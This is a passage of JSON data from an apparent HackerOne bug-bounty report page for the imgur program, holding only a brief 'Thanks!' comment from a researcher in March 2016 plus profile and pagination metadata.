_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":838897,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","markdown_message":"\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-14T17:41:01.553Z","updated_at":"2016-03-14T17:41:01.553Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}